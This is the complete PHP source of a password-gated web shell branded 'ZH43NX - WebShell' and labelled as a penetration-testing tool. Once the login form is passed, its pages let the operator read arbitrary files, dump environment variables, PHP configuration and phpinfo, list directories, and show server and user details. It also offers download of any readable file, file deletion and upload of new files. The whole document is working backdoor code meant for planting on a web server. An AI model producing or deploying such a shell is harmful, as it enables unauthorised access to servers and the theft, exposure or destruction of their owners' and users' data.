<?php
// <!-- Login start -->
ob_start();
session_start();

$hash = '$2a$16$dNUmFCHyYvE34bJv0aVqs.dvkYNPNrYDfr8juzeG71O2JvPf0DylS'; // hash dari <Zhaenx6702/>

if (!isset($_SESSION['auth'])) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['pass']) && password_verify($_POST['pass'], $hash)) {
        $_SESSION['auth'] = true;
        header("Location: " . $_SERVER['PHP_SELF']);
        exit;
    }
    ?>
<!DOCTYPE html>
<html>

   <head>
      <title>Login - Zhaenx Shell</title>
      <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.6/dist/css/bootstrap.min.css" rel="stylesheet"
         integrity="sha384-4Q6Gf2aSP4eDXB8Miphtr37CMZZQ5oXLH2yaXMJ2w8e2ZtHTl7GptT4jmndRuHDT" crossorigin="anonymous" />
      <link rel="preconnect" href="https://fonts.googleapis.com" />
      <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
      <link
         href="https://fonts.googleapis.com/css2?family=Iceberg&family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap"
         rel="stylesheet" />
      <style>
      body {
         background-color: rgb(16, 19, 24);
         color: #9fef00;
         display: flex;
         justify-content: center;
         align-items: center;
         height: 100vh;
      }

      input {
         margin: 0 5px;
      }

      .login {
         font-size: 2rem;
         font-family: "Iceberg", "verdana", sans-serif;
         font-weight: 700;
         text-align: center;
         line-height: 1;
      }

      .zxform-controlInput,
      .zxform-controlInput:focus {
         background: rgb(0, 0, 0);
         color: #9fef00;
         border: 2px solid #9fef00;
         border-radius: 12px;
         font-style: 1rem;
         margin: 0 0 0 5px;
         box-shadow: none;
         font-family: "Iceberg", "Poppins", sans-serif;
      }

      .zxform-controlInput::placeholder {
         color: #9fef00;
         font-family: "Iceberg", "Poppins", sans-serif;
      }

      .zxBtn,
      .zxBtn:hover {
         background: rgb(0, 0, 0);
         color: #9fef00;
         font-size: 1.2rem;
         font-family: "Iceberg", "Poppins", sans-serif;
         font-weight: 500;
         border-radius: 10px;
         border: 2px solid #9fef00;
         padding: 8px;
         min-width: 4.5rem;
         height: 3rem;
         display: flex;
         justify-content: center;
         align-items: center;
      }
      </style>
   </head>

   <body>
      <div class="container d-flex justify-content-center align-items-center">
         <div class="row col-lg-5">
            <h1 class="login">Please Login.!</h1>
            <form method="POST" class="d-flex">
               <input type="password" name="pass" placeholder="Password..." class="form-control form-control-lg zxform-controlInput">
               <input type="submit" value="Login" class="btn zxBtn">
            </form>
         </div>
      </div>
   </body>

</html>
<?php
exit;
}
   //  <!-- Login end -->
   
// COMMAND EXECUTION
$output = '';
$phpinfoMode = false;

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['cmd'])) {
    $cmd = trim($_POST['cmd']);

   if (substr($cmd, 0, 3) === 'cd ') {
      $dir = trim(substr($cmd, 3));
      if (@chdir($dir)) {
         $output = "Changed directory to: " . getcwd();
      } else {
         $output = "Failed to change directory.";
      }

    } elseif ($cmd === 'ls') {
        $output = implode("\n", scandir('.'));

    } elseif (substr($cmd, 0, 4) === 'cat ') {
        $file = trim(substr($cmd, 4));
        $output = is_readable($file) ? file_get_contents($file) : "Cannot read file";

    } elseif ($cmd === 'pwd') {
        $output = getcwd();

    } elseif ($cmd === 'clear' || $cmd === 'cls') {
        $output = '';

    } elseif ($cmd === 'whoami') {
        $output = get_current_user();
        
    } elseif ($cmd === 'env') {
         $output = print_r($_ENV, true);

    } elseif ($cmd === 'ext') {
      $output = implode("\n", get_loaded_extensions());

    } elseif ($cmd === 'uname') {
        $output = php_uname();

    } elseif ($cmd === 'phpinfo') {
        $phpinfoMode = true;
        
    } elseif ($cmd === 'ini') {
    $output = print_r(ini_get_all(null, false), true);
    
    } else {
        $output = "Command not supported.";
    } 
}


// FILE DOWNLOAD
if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['download_file'])) {
    $file = $_GET['download_file'];
    if (is_readable($file)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
        readfile($file);
        exit;
    } else {
        $output = "Download failed: Cannot read file.";
    }
}

// FILE DELETE
if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['delete_file'])) {
    $file = $_GET['delete_file'];
    if (is_file($file)) {
        $output = unlink($file) ? "Deleted: $file" : "Failed to delete: $file";
    } else {
        $output = "Invalid file: $file";
    }
}

// FILE UPLOAD
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['upload_file'])) {
    $target = basename($_FILES['upload_file']['name']);
    if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $target)) {
        $output = "Uploaded: $target";
    } else {
        $output = "Upload failed.";
    }
}


if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}
?>
<!DOCTYPE html>
<html>

   <head>
      <title>Webshell - ZH43NX</title>
      <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.6/dist/css/bootstrap.min.css" rel="stylesheet"
         integrity="sha384-4Q6Gf2aSP4eDXB8Miphtr37CMZZQ5oXLH2yaXMJ2w8e2ZtHTl7GptT4jmndRuHDT" crossorigin="anonymous" />
      <link rel="preconnect" href="https://fonts.googleapis.com" />
      <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
      <link
         href="https://fonts.googleapis.com/css2?family=Iceberg&family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap"
         rel="stylesheet" />

      <style>
      body {
         background: rgb(16, 19, 24);
         color: #9fef00;
         display: flex;
         justify-content: center;
         align-items: center;
         min-height: 100vh;
      }

      h1 {
         font-size: 4rem;
         font-family: "Iceberg", "verdana", sans-serif;
         font-weight: 700;
         text-align: center;
         margin: 0;
         line-height: 1;
      }

      p,
      h5 {
         font-size: 1.4rem;
         font-family: "Iceberg", "Poppins", sans-serif;
         font-weight: 500;
         text-align: center;
         margin: 0;
      }

      .zxBtn,
      .zxBtn:hover,
      .btnLogout {
         background: rgb(0, 0, 0);
         color: #9fef00;
         font-size: 1.2rem;
         font-family: "Iceberg", "Poppins", sans-serif;
         font-weight: 500;
         border-radius: 10px;
         border: 2px solid #9fef00;
         padding: 8px;
         min-width: 8.5rem;
         height: 3rem;
         display: flex;
         justify-content: center;
         align-items: center;
      }

      .zxform-controlInput,
      .zxform-controlInput:focus {
         background: rgb(0, 0, 0);
         color: #9fef00;
         border: 2px solid #9fef00;
         border-radius: 12px;
         font-style: 1rem;
         margin: 0 5px 0 0;
         box-shadow: none;
         font-family: "Iceberg", "Poppins", sans-serif;
      }

      .zxform-controlInput::placeholder {
         color: #9fef00;
         font-family: "Iceberg", "Poppins", sans-serif;
      }

      h5 {
         font-size: 1.2rem;
         text-align: justify;
      }

      .btnn {
         max-width: 6rem;
      }

      .btnLogout,
      .btnLogout:hover {
         min-width: 2rem;
         height: 2rem;
         font-size: 1rem;
         margin: 0;
         padding: 0;
      }
      </style>
   </head>

   <body>
      <section class="p-0 m-0">
         <div class="container-fluid p-0 m-0">


            <div class="row">
               <div class="btnn">
                  <a href="?logout=true" class="btn zxBtn btnLogout">Logout</a>

               </div>

               <div class="col-lg-12 mb-3 user-select-none">
                  <h1 class="mb-4">ZH43NX - WebShell
                     <p>(Ethical Hacker - Web Penetrations Testing)</p>
                  </h1>
               </div>

               <div class="col-lg-12 d-flex">
                  <div class="col-lg-6 d-flex justify-content-start align-items-center">
                     <div class="t">
                        <h5><?php echo 'User : ' . get_current_user(); ?></h5>
                        <h5><?php echo 'Server : ' . $_SERVER['SERVER_SOFTWARE']; ?></h5>
                     </div>
                  </div>
                  <div class="col-lg-6 d-flex justify-content-end align-items-center">
                     <div class="t">
                        <h5><?php echo 'UID : ' . getmyuid(); ?></h5>
                        <h5><?php echo 'Group : ' . getmygid(); ?></h5>
                     </div>
                  </div>
               </div>

               <div class="col-lg-12">
                  <!-- FORM: COMMAND EXECUTION -->
                  <form method="POST" class="my-3 d-flex justify-content-center align-items-center">
                     <input type="text" class="form-control form-control-lg zxform-controlInput" name="cmd" placeholder="Input Command..."
                        autofocus />
                     <button class="btn zxBtn" value="Execute">Execute</button>
                  </form>

                  <!-- FORM: FILE DOWNLOAD -->
                  <form method=" GET" class="my-3 d-flex justify-content-center align-items-center">
                     <input type="text" class="form-control form-control-lg zxform-controlInput" name="download_file"
                        placeholder=" Filename to download..." autocomplete="off" required />
                     <button class="btn zxBtn">Download File</button>
                  </form>

                  <!-- FORM: FILE DELETE -->
                  <form method="GET" class="my-3 d-flex justify-content-center align-items-center">
                     <input type="text" class="form-control form-control-lg zxform-controlInput" name="delete_file"
                        placeholder="Filename to delete..." autocomplete="off" required />
                     <button class="btn zxBtn">Delete File</button>
                  </form>

                  <!-- FORM: FILE UPLOAD -->
                  <form method="POST" class="my-3 d-flex justify-content-center align-items-center" enctype="multipart/form-data">
                     <!-- <p>Upload File</p> -->
                     <input type="file" class="form-control form-control-lg zxform-controlInput" name="upload_file" required />
                     <button type="submit" class="btn zxBtn">Upload File</button>
                  </form>

                  <!-- Output -->
                  <?php if ($phpinfoMode): ?>
                  <?php phpinfo(); ?>
                  <?php else: ?>
                  <!-- FORM OUTPUT-->
                  <div class="my-3">
                     <textarea class="form-control zxform-controlInput" rows="14" readonly><?= htmlspecialchars($output) ?></textarea>
                  </div>
                  <?php endif; ?>
               </div>
            </div>
         </div>
      </section>
   </body>

</html>